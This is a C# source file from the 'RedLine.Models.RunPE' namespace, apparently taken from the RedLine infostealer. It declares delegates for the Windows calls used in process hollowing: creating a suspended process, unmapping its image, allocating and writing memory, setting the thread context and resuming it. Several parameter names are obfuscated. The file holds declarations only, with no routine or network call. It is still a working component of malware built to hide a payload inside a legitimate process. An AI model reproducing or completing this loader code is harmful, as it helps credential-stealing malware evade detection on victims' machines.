using System;
using System.Runtime.InteropServices;

namespace RedLine.Models.RunPE
{
  public static class NativeDelegates
  {
    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool IsWow64ProcessDelegate([MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isWow64);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool WriteProcessMemoryDelegate(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpBaseAddress,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU,
      [MarshalAs(UnmanagedType.U4)] uint nSize,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpNumberOfBytesWritten);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool TerminateProcessDelegate([MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess, [MarshalAs(UnmanagedType.I4)] int exitCode);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool CloseHandleDelegate(IntPtr handle);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool CreateProcessInternalWDelegate(
      [MarshalAs(UnmanagedType.U4)] uint hToken,
      [MarshalAs(UnmanagedType.LPTStr)] string lpApplicationName,
      [MarshalAs(UnmanagedType.LPTStr)] string lpCommandLine,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpProcessAttributes,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpThreadAttributes,
      [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
      [MarshalAs(UnmanagedType.U4)] uint dwCreationFlags,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpEnvironment,
      [MarshalAs(UnmanagedType.LPTStr)] string lpCurrentDirectory,
      [In] ref STARTUPINFO lpStartupInfo,
      out PROCESS_INFORMATION lpProcesSystemNetCertPolicyValidationCallbackv,
      [MarshalAs(UnmanagedType.U4)] uint hNewToken);

    [return: MarshalAs(UnmanagedType.Bool)]
    public unsafe delegate bool Wow64GetThreadContextDelegate([MarshalAs(UnmanagedType.SysInt)] IntPtr hThread, CONTEXT* pContext);

    [return: MarshalAs(UnmanagedType.Bool)]
    public unsafe delegate bool Wow64SetThreadContextDelegate([MarshalAs(UnmanagedType.SysInt)] IntPtr hThread, CONTEXT* pContext);

    public delegate uint NtUnmapViewOfSectionDelegate([MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess, [MarshalAs(UnmanagedType.SysInt)] IntPtr lpBaseAddress);

    public delegate IntPtr VirtualAllocExDelegate(
      [MarshalAs(UnmanagedType.SysInt)] IntPtr hProcess,
      [MarshalAs(UnmanagedType.SysInt)] IntPtr lpAddress,
      [MarshalAs(UnmanagedType.U4)] uint dwSize,
      [MarshalAs(UnmanagedType.U4)] uint flAllocationType,
      [MarshalAs(UnmanagedType.U4)] uint flProtect);

    public delegate uint ResumeThreadDelegate([MarshalAs(UnmanagedType.SysInt)] IntPtr hThread);
  }
}
